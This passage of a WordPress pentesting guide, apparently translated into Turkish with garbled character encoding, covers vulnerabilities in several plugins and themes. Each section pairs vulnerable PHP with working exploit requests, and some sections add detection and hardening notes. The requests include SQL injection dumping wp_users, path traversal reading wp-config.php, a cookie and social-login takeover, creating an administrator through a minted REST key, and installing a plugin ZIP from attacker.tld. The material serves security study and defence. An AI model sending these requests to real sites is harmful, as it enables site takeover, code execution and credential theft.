Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Detection checklist

* Any `add_action( 'wp_ajax_nopriv_...')` callback that calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenation of unsanitised user input into paths (look for `$_POST`, `$_GET`, `$_REQUEST`).
* Absence of `check_ajax_referer()` and `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

BirÃ§ok plugin, orijinal role(leri) user meta iÃ§inde saklayarak daha sonra geri yÃ¼klenebilmeleri iÃ§in "view as role" veya geÃ§ici role-deÄŸiÅŸtirme Ã¶zelliÄŸi uygular. EÄŸer geri yÃ¼kleme yolu sadece istek parametrelerine (Ã¶r. `$_REQUEST['reset-for']`) ve plugin tarafÄ±ndan yÃ¶netilen bir listeye dayanÄ±yor, yetenekler (capabilities) kontrolÃ¼ ve geÃ§erli bir nonce doÄŸrulamasÄ± yapÄ±lmÄ±yorsa, bu dikey ayrÄ±calÄ±k yÃ¼kseltmeye (vertical privilege escalation) yol aÃ§ar.

GerÃ§ek dÃ¼nya Ã¶rneÄŸi Admin and Site Enhancements (ASE) plugininde (â‰¤ 7.6.2.1) bulundu. Reset dalÄ±, kullanÄ±cÄ± adÄ± dahili bir dizi `$options['viewing_admin_as_role_are']` iÃ§inde gÃ¶rÃ¼nÃ¼yorsa `reset-for=<username>` bazÄ±nda rolleri geri yÃ¼klÃ¼yordu, ancak mevcut rolleri kaldÄ±rmadan ve user meta `_asenha_view_admin_as_original_roles` iÃ§indeki kaydedilmiÅŸ rolleri yeniden eklemeden Ã¶nce ne bir `current_user_can()` kontrolÃ¼ ne de bir nonce doÄŸrulamasÄ± yapÄ±yordu:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Neden istismara aÃ§Ä±k

- Sunucu tarafÄ± yetkilendirmesi olmadan `$_REQUEST['reset-for']` ve bir plugin seÃ§eneÄŸine gÃ¼veniyor.
- EÄŸer bir kullanÄ±cÄ±nÄ±n daha yÃ¼ksek ayrÄ±calÄ±klarÄ± `_asenha_view_admin_as_original_roles` iÃ§inde kaydedilmiÅŸse ve ayrÄ±calÄ±klarÄ± dÃ¼ÅŸÃ¼rÃ¼lmÃ¼ÅŸse, sÄ±fÄ±rlama yolunu tetikleyerek bunlarÄ± geri yÃ¼kleyebilir.
- BazÄ± daÄŸÄ±tÄ±mlarda, herhangi bir kimliÄŸi doÄŸrulanmÄ±ÅŸ kullanÄ±cÄ± `viewing_admin_as_role_are` iÃ§inde hÃ¢lÃ¢ bulunan baÅŸka bir kullanÄ±cÄ± adÄ± iÃ§in sÄ±fÄ±rlamayÄ± tetikleyebilir (kÄ±rÄ±k yetkilendirme).

Ä°stismar (Ã¶rnek)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Zafiyetli sÃ¼rÃ¼mlerde bu, mevcut rolleri kaldÄ±rÄ±r ve kaydedilmiÅŸ orijinal rolleri (Ã¶r. `administrator`) yeniden ekler; etkili olarak ayrÄ±calÄ±klarÄ± yÃ¼kseltir.

Detection checklist

- KullanÄ±cÄ± meta'sÄ±nda â€œorijinal rollerâ€i (Ã¶r. `_asenha_view_admin_as_original_roles`) saklayan rol-deÄŸiÅŸtirme Ã¶zelliklerini arayÄ±n.
- AÅŸaÄŸÄ±daki reset/restore yollarÄ±nÄ± belirleyin:
- KullanÄ±cÄ± adlarÄ±nÄ± `$_REQUEST` / `$_GET` / `$_POST` Ã¼zerinden okuyan.
- `current_user_can()` ve `wp_verify_nonce()` / `check_admin_referer()` kontrolleri olmadan `add_role()` / `remove_role()` ile rolleri deÄŸiÅŸtiren.
- Yetkilendirmeyi aktÃ¶rÃ¼n yetenekleri yerine bir eklenti seÃ§enek dizisine (Ã¶r. `viewing_admin_as_role_are`) dayandÄ±ran.

---

### Kimlik doÄŸrulanmamÄ±ÅŸ ayrÄ±calÄ±k yÃ¼kseltme via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

BazÄ± eklentiler kullanÄ±cÄ±-deÄŸiÅŸtirme yardÄ±mcÄ±larÄ±nÄ± public `init` hook'una baÄŸlar ve kimliÄŸi istemci kontrollÃ¼ bir cookie'den tÃ¼retir. EÄŸer kod kimlik doÄŸrulama, yetki ve geÃ§erli bir nonce'u doÄŸrulamadan `wp_set_auth_cookie()` Ã§aÄŸÄ±rÄ±yorsa, herhangi bir kimlik doÄŸrulanmamÄ±ÅŸ ziyaretÃ§i rastgele bir kullanÄ±cÄ± ID'si ile giriÅŸ yapmaya zorlayabilir.

Tipik zafiyetli desen (Service Finder Bookings â‰¤ 6.1'den basitleÅŸtirilmiÅŸ):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Neden istismar edilebilir

- AÃ§Ä±k `init` hook, handler'Ä± unauthenticated users tarafÄ±ndan eriÅŸilebilir kÄ±lar (no `is_user_logged_in()` guard).
- Kimlik, client-modifiable cookie (`original_user_id`)'dan tÃ¼retilir.
- DoÄŸrudan `wp_set_auth_cookie($uid)` Ã§aÄŸrÄ±sÄ± isteÄŸi yapanÄ± herhangi bir capability/nonce kontrolÃ¼ olmadan o kullanÄ±cÄ± olarak oturum aÃ§tÄ±rÄ±r.

Ä°stismar (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many highâ€‘impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Donâ€™t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
AyrÄ±ca, **yalnÄ±zca gÃ¼venilir WordPress eklentilerini ve temalarÄ±nÄ± yÃ¼kleyin**.

### GÃ¼venlik Eklentileri

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **DiÄŸer Ã–neriler**

- VarsayÄ±lan **admin** kullanÄ±cÄ±sÄ±nÄ± kaldÄ±rÄ±n
- **GÃ¼Ã§lÃ¼ parolalar** ve **2FA** kullanÄ±n
- KullanÄ±cÄ± **izinlerini** periyodik olarak **gÃ¶zden geÃ§irin**
- **GiriÅŸ denemelerini sÄ±nÄ±rlayÄ±n** â€” Brute Force saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in
- **`wp-admin.php`** dosyasÄ±nÄ±n adÄ±nÄ± deÄŸiÅŸtirin ve yalnÄ±zca dahili veya belirli IP adreslerinden eriÅŸime izin verin.


### Yetersiz doÄŸrulama nedeniyle kimlik doÄŸrulama gerektirmeyen SQL Injection (WP Job Portal <= 2.3.2)

WP Job Portal iÅŸe alÄ±m eklentisi, **savecategory** adlÄ± bir gÃ¶revi aÃ§Ä±ÄŸa Ã§Ä±kardÄ±; bu gÃ¶rev en sonunda `modules/category/model.php::validateFormData()` iÃ§indeki aÅŸaÄŸÄ±daki savunmasÄ±z kodu Ã§alÄ±ÅŸtÄ±rÄ±r:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **TemizlenmemiÅŸ kullanÄ±cÄ± girdisi** â€“ `parentid` HTTP isteÄŸinden doÄŸrudan geliyor.
2. **WHERE cÃ¼mlesinde string birleÅŸtirme** â€“ `is_numeric()` / `esc_sql()` / prepared statement yok.
3. **Kimlik doÄŸrulamasÄ± gerektirmeyen eriÅŸim** â€“ action `admin-post.php` Ã¼zerinden Ã§alÄ±ÅŸtÄ±rÄ±lsa da mevcut tek kontrol **CSRF nonce** (`wp_verify_nonce()`), ve herhangi bir ziyaretÃ§i `[wpjobportal_my_resumes]` shortcode'unu iÃ§eren herkese aÃ§Ä±k bir sayfadan bunu alabilir.

#### Ä°stismar

1. Yeni bir nonce al:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`'i suistimal ederek rastgele SQL enjekte et:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
YanÄ±t, enjekte edilen sorgunun sonucunu aÃ§Ä±ÄŸa Ã§Ä±karÄ±r veya veritabanÄ±nÄ± deÄŸiÅŸtirir; bu da SQLi'yi kanÄ±tlar.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Another task, **downloadcustomfile**, allowed visitors to download **herhangi bir dosyayÄ±** via path traversal.  The vulnerable sink is located in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` saldÄ±rgan tarafÄ±ndan kontrol ediliyor ve **sanitizasyon yapÄ±lmadan** birleÅŸtiriliyor. Yine, tek engel, Ã¶zgeÃ§miÅŸ sayfasÄ±ndan alÄ±nabilecek bir **CSRF nonce**.

#### Ä°stismar
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
The server responds with the contents of `wp-config.php`, leaking DB credentials and auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

BirÃ§ok tema/eklenti, admin-ajax.php Ã¼zerinden eriÅŸilebilen "social login" yardÄ±mcÄ±larÄ± iÃ§erir. EÄŸer kimlik doÄŸrulanmamÄ±ÅŸ bir AJAX action (wp_ajax_nopriv_...) saÄŸlayÄ±cÄ± verisi eksik olduÄŸunda istemci tarafÄ±ndan saÄŸlanan tanÄ±mlayÄ±cÄ±larÄ± gÃ¼venir ve ardÄ±ndan wp_set_auth_cookie() Ã§aÄŸÄ±rÄ±rsa, bu tam bir authentication bypass'a dÃ¶nÃ¼ÅŸÃ¼r.

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Neden istismar edilebilir

- admin-ajax.php Ã¼zerinden kimlik doÄŸrulamasÄ± olmadan eriÅŸim (wp_ajax_nopriv_â€¦ action).
- Durum deÄŸiÅŸikliÄŸinden Ã¶nce nonce/capability kontrolleri yok.
- OAuth/OpenID saÄŸlayÄ±cÄ± doÄŸrulamasÄ± eksik; default branch saldÄ±rgan girdisini kabul ediyor.
- get_user_by('email', $_POST['id'])'den sonra wp_set_auth_cookie($uid) Ã§aÄŸrÄ±sÄ±, isteÄŸi yapanÄ± mevcut herhangi bir e-posta adresi olarak kimliklendiriyor.

Ä°stismar (kimlik doÄŸrulamasÄ±z)

- Ã–nkoÅŸullar: saldÄ±rgan /wp-admin/admin-ajax.php'ye eriÅŸebiliyor ve geÃ§erli bir kullanÄ±cÄ± e-posta adresini biliyor/tahmin ediyor.
- Provider'Ä± desteklenmeyen bir deÄŸere ayarlayÄ±n (veya hiÃ§ gÃ¶ndermeyin) bÃ¶ylece default branch'e dÃ¼ÅŸÃ¼p id=<victim_email> gÃ¶nderin.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Beklenen baÅŸarÄ± gÃ¶stergeleri

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* maÄŸdur kullanÄ±cÄ± iÃ§in; sonraki istekler kimlik doÄŸrulanmÄ±ÅŸ olur.

Finding the action name

- Tema/plugini, social login kodunda add_action('wp_ajax_nopriv_...', '...') kayÄ±tlarÄ± iÃ§in inceleyin (Ã¶r. framework/add-ons/social-login/class-social-login.php).
- AJAX handler'larÄ±nda wp_set_auth_cookie(), get_user_by('email', ...) iÃ§in grep yapÄ±n.

Detection checklist

- Web gÃ¼nlÃ¼kleri, social-login action ve id=<email> ile /wp-admin/admin-ajax.php'ye yapÄ±lmÄ±ÅŸ kimlik doÄŸrulanmamÄ±ÅŸ POST'larÄ± gÃ¶steriyor.
- AynÄ± IP/User-Agent'ten gelen yetkili trafiÄŸin hemen Ã¶ncesinde success JSON iÃ§eren 200 yanÄ±tlar.

Hardening

- KimliÄŸi istemci girdisinden tÃ¼retmeyin. YalnÄ±zca doÄŸrulanmÄ±ÅŸ saÄŸlayÄ±cÄ± token/ID'den kaynaklanan email/ID'leri kabul edin.
- GiriÅŸ yardÄ±mcÄ±larÄ± iÃ§in bile CSRF nonces ve capability kontrollerini zorunlu kÄ±lÄ±n; wp_ajax_nopriv_ kaydÄ±ndan kaÃ§Ä±nÄ±n (sadece gerekli ise).
- OAuth/OIDC cevaplarÄ±nÄ± sunucu tarafÄ±nda doÄŸrulayÄ±n ve teyit edin; eksik/geÃ§ersiz saÄŸlayÄ±cÄ±larÄ± reddedin (POST id'ye geri dÃ¶nÃ¼ÅŸ olmasÄ±n).
- DÃ¼zeltme yapÄ±lana kadar social login'i geÃ§ici olarak devre dÄ±ÅŸÄ± bÄ±rakmayÄ± veya kenarda sanal bir patch ile (zayÄ±f action'Ä± engelleyerek) Ã¶nlem almayÄ± dÃ¼ÅŸÃ¼nÃ¼n.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

BazÄ± eklentiler, Ã§aÄŸÄ±ranÄ±n yetkilerini doÄŸrulamadan yeniden kullanÄ±labilir â€œconnection keysâ€ veya tokenlar Ã¼reten REST endpoint'leri aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. EÄŸer rota yalnÄ±zca tahmin edilebilir bir Ã¶zniteliÄŸe (Ã¶r. username) gÃ¶re kimlik doÄŸrulamasÄ± yapÄ±yor ve anahtarÄ± yetki kontrolleriyle bir kullanÄ±cÄ±/oturuma baÄŸlamÄ±yorsa, herhangi bir kimlik doÄŸrulanmamÄ±ÅŸ saldÄ±rgan bir anahtar mintleyebilir ve ayrÄ±calÄ±klÄ± eylemleri tetikleyebilir (admin hesap oluÅŸturma, plugin eylemleri â†’ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ bir connection key mintleyin ve kullanÄ±n
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Neden sÃ¶mÃ¼rÃ¼lebilir
- Hassas REST route yalnÄ±zca dÃ¼ÅŸÃ¼k-entropili kimlik kanÄ±tÄ± (username) ile korunuyor veya permission_callback eksik
- Yetki denetimi yok; oluÅŸturulan anahtar evrensel bir atlatma olarak kabul ediliyor

Tespit kontrol listesi
- register_rest_route(..., [ 'permission_callback' => '__return_true' ]) iÃ§in plugin kodunda grep yapÄ±n
- Ä°stemci tarafÄ±ndan saÄŸlanan kimliÄŸe (username/email) dayalÄ± token/anahtar veren ve bunlarÄ± kimlik doÄŸrulanmÄ±ÅŸ bir kullanÄ±cÄ±ya veya capability'e baÄŸlamayan herhangi bir route
- Sunucu tarafÄ± capability kontrolleri olmadan oluÅŸturulan token/anahtarÄ± kabul eden sonraki route'larÄ± arayÄ±n

SertleÅŸtirme
- Herhangi bir ayrÄ±calÄ±klÄ± REST route iÃ§in: gerekli capability iÃ§in current_user_can()'Ä± uygulayan bir permission_callback zorunlu kÄ±lÄ±n
- Ä°stemci tarafÄ±ndan saÄŸlanan kimlikten uzun Ã¶mÃ¼rlÃ¼ anahtarlar oluÅŸturmayÄ±n; gerekliyse, kimlik doÄŸrulamadan sonra kÄ±sa Ã¶mÃ¼rlÃ¼, kullanÄ±cÄ±ya baÄŸlÄ± tokenler Ã§Ä±karÄ±n ve kullanÄ±mda capability'leri yeniden kontrol edin
- Ã‡aÄŸÄ±ranÄ±n kullanÄ±cÄ± baÄŸlamÄ±nÄ± doÄŸrulayÄ±n (wp_set_current_user tek baÅŸÄ±na yeterli deÄŸildir) ve !is_user_logged_in() || !current_user_can(<cap>) koÅŸulunda istekleri reddedin

---

## Nonce gate misuse â†’ unauthenticated arbitrary plugin installation (FunnelKit Automations â‰¤ 3.5.3)

Nonces prevent CSRF, not authorization. EÄŸer kod bir nonce onayÄ±nÄ± yeÅŸil Ä±ÅŸÄ±k olarak kabul edip ardÄ±ndan ayrÄ±calÄ±klÄ± iÅŸlemler iÃ§in capability kontrollerini atlÄ±yorsa (Ã¶r., install/activate plugins), kimlik doÄŸrulanmamÄ±ÅŸ saldÄ±rganlar zayÄ±f bir nonce gereksinimini karÅŸÄ±layÄ±p arka kapÄ±lÄ± veya zafiyetli bir plugin yÃ¼kleyerek RCE'ye ulaÅŸabilir.

- Etkilenen yol: plugin/install_and_activate
- Hata: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Etkisi: rastgele plugin install/activation ile tam ele geÃ§irme

PoC (yapÄ± plugin'e baÄŸlÄ±dÄ±r; sadece aÃ§Ä±klayÄ±cÄ±dÄ±r)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- Sadece wp_verify_nonce()/check_admin_referer() kullanan ve herhangi bir capability kontrolÃ¼ olmayan plugins/themes'i deÄŸiÅŸtiren REST/AJAX iÅŸleyicileri
- Nonce doÄŸrulamasÄ±ndan sonra $skip_caps = true olarak ayarlayan herhangi bir kod yolu

Hardening
- Nonces'larÄ± her zaman sadece CSRF token'Ä± olarak deÄŸerlendirin; nonce durumundan baÄŸÄ±msÄ±z olarak capability kontrollerini zorunlu kÄ±lÄ±n
- Installer koduna ulaÅŸÄ±lmadan Ã¶nce current_user_can('install_plugins') ve current_user_can('activate_plugins') gerektirilsin
- KimliÄŸi doÄŸrulanmamÄ±ÅŸ eriÅŸimi reddedin; ayrÄ±calÄ±klÄ± akÄ±ÅŸlar iÃ§in nopriv AJAX action'larÄ±nÄ± aÃ§Ä±ÄŸa Ã§Ä±karmaktan kaÃ§Ä±nÄ±n

### Subscriber+ AJAX plugin installer â†’ zorla kÃ¶tÃ¼ amaÃ§lÄ± aktivasyon (Motors Theme â‰¤ 5.6.81)

[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/) showed how the Motors theme ships an authenticated AJAX helper for installing its companion plugin:
```php
add_action('wp_ajax_mvl_theme_install_base', 'mvl_theme_install_base');

function mvl_theme_install_base() {
check_ajax_referer('mvl_theme_install_base', 'nonce');

$plugin_url  = sanitize_text_field($_GET['plugin']);
$plugin_slug = 'motors-car-dealership-classified-listings';

$upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));
$upgrader->install($plugin_url);
mvl_theme_activate_plugin($plugin_slug);
}
```
- Only `check_ajax_referer()` is called; there is no `current_user_can('install_plugins')` or `current_user_can('activate_plugins')`.
- The nonce is embedded in the Motors admin page, so any Subscriber that can open `/wp-admin/` can copy it from the HTML/JS.
- The handler trusts the attacker-controlled `plugin` parameter (read from `$_GET`) and passes it into `Plugin_Upgrader::install()`, so an arbitrary remote ZIP is downloaded into `wp-content/plugins/`.
- After installation the theme unconditionally calls `mvl_theme_activate_plugin()`, guaranteeing execution of the attacker plugin's PHP code.

#### Ä°stismar akÄ±ÅŸÄ±

1. DÃ¼ÅŸÃ¼k ayrÄ±calÄ±klÄ± bir hesap oluÅŸturun/ele geÃ§irin (Subscriber yeterlidir) ve Motors dashboard UI'sinden `mvl_theme_install_base` nonce'unu alÄ±n.
2. Top-level dizini beklenen slug ile eÅŸleÅŸen bir plugin ZIP oluÅŸturun: `motors-car-dealership-classified-listings/` ve `*.php` entry points iÃ§ine bir backdoor veya webshell gÃ¶mÃ¼n.
3. ZIP'i barÄ±ndÄ±rÄ±n ve installer'Ä± tetiklemek iÃ§in handler'Ä± URL'inize yÃ¶nlendirin:
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Cookie: wordpress_logged_in_=...
Content-Type: application/x-www-form-urlencoded

action=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip
```
Ã‡Ã¼nkÃ¼ iÅŸleyici `$_GET['plugin']` Ã¶ÄŸesini okuduÄŸu iÃ§in aynÄ± payload sorgu dizesi aracÄ±lÄ±ÄŸÄ±yla da gÃ¶nderilebilir.

#### Detection checklist

- Temalar/eklentiler iÃ§inde `Plugin_Upgrader`, `Theme_Upgrader` veya yetki kontrolleri olmadan `wp_ajax_*` hook'larÄ±na baÄŸlÄ± Ã¶zel `install_plugin.php` yardÄ±mcÄ±larÄ±nÄ± ara.
- Bir `plugin`, `package`, `source` veya `url` parametresi alÄ±p bunu upgrader API'larÄ±na veren herhangi bir iÅŸleyiciyi inceleyin; Ã¶zellikle slug sabit kodlanmÄ±ÅŸ ama ZIP iÃ§eriÄŸi doÄŸrulanmÄ±yorsa.
- YÃ¼kleyici iÅŸlemleri iÃ§in nonce'larÄ± aÃ§Ä±ÄŸa Ã§Ä±karan yÃ¶netici sayfalarÄ±nÄ± gÃ¶zden geÃ§irinâ€”eÄŸer Subscribers sayfayÄ± yÃ¼kleyebiliyorsa, nonce'un leak olduÄŸunu varsayÄ±n.

#### Hardening

- Nonce doÄŸrulamasÄ±ndan sonra installer AJAX callback'lerini `current_user_can('install_plugins')` ve `current_user_can('activate_plugins')` ile sÄ±nÄ±rlandÄ±rÄ±n; Motors 5.6.82 bu hatayÄ± dÃ¼zeltmek iÃ§in bu kontrolÃ¼ ekledi.
- GÃ¼venilmeyen URL'leri reddedin: yÃ¼kleyicileri paketlenmiÅŸ ZIP'ler veya gÃ¼venilir depolar ile sÄ±nÄ±rlayÄ±n ya da imzalanmÄ±ÅŸ indirme manifestolarÄ±nÄ± zorunlu kÄ±lÄ±n.
- Nonce'larÄ± katÄ± ÅŸekilde CSRF tokenleri olarak ele alÄ±n; bunlar yetkilendirme saÄŸlamaz ve asla yetki kontrollerinin yerine geÃ§memelidir.

---

## Yetkilendirmesiz SQLi depicter-* eylemlerindeki s arama parametresi aracÄ±lÄ±ÄŸÄ±yla (Depicter Slider â‰¤ 3.6.1)

Birden fazla depicter-* eylemi s (search) parametresini kullanÄ±yor ve bunu parametreleÅŸtirme olmadan SQL sorgularÄ±na ekliyordu.

- Parameter: s (search)
- Flaw: WHERE/LIKE ifadelerinde doÄŸrudan string birleÅŸtirme; prepared statements/sanitization yok
- Impact: veritabanÄ± exfiltration (kullanÄ±cÄ±lar, hash'ler), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- depicter-* action handler'larÄ±nÄ± ve SQL iÃ§inde $_GET['s'] veya $_POST['s'] doÄŸrudan kullanÄ±mÄ±nÄ± ara
- $wpdb->get_results()/query() aracÄ±lÄ±ÄŸÄ±yla s'yi birleÅŸtirerek geÃ§en Ã¶zel sorgularÄ± incele

Hardening
- Her zaman $wpdb->prepare() veya wpdb placeholders kullan; sunucu tarafÄ±nda beklenmeyen metakarakterleri reddet
- s iÃ§in sÄ±kÄ± bir allowlist ekle ve beklenen charset/uzunluÄŸa normalize et

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder â‰¤ 2.5.1)

Normalization/containment olmadan template parametresinde attacker-controlled path'larÄ± kabul etmek, rastgele local dosyalarÄ±n okunmasÄ±na izin verir ve includable PHP/log dosyalarÄ± runtime'a Ã§ekilirse bazen kod yÃ¼rÃ¼tÃ¼lmesine yol aÃ§abilir.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: no normalization/allowlisting; traversal permitted
- Impact: secret disclosure (wp-config.php), potential RCE in specific environments (log poisoning, includable PHP)

PoC â€“ wp-config.php oku
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Detection checklist
- Ä°stek yollarÄ±nÄ± include()/require()/read sink'larÄ±na realpath() ile sÄ±nÄ±rlandÄ±rma olmadan birleÅŸtiren herhangi bir handler
- Hedeflenen ÅŸablonlar dizininin dÄ±ÅŸÄ±na Ã§Ä±kan traversal desenleri (../) arayÄ±n

Hardening
- Ä°zin verilen ÅŸablonlarÄ± zorunlu kÄ±lÄ±n; realpath() ile Ã§Ã¶zÃ¼mleyin ve require str_starts_with(realpath(file), realpath(allowed_base))
- Girdiyi normalize edin; traversal dizilerini ve mutlak yollarÄ± reddedin; sanitize_file_name() yalnÄ±zca dosya adlarÄ± iÃ§in kullanÄ±n (tam yollar iÃ§in deÄŸil)


## Referanslar

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
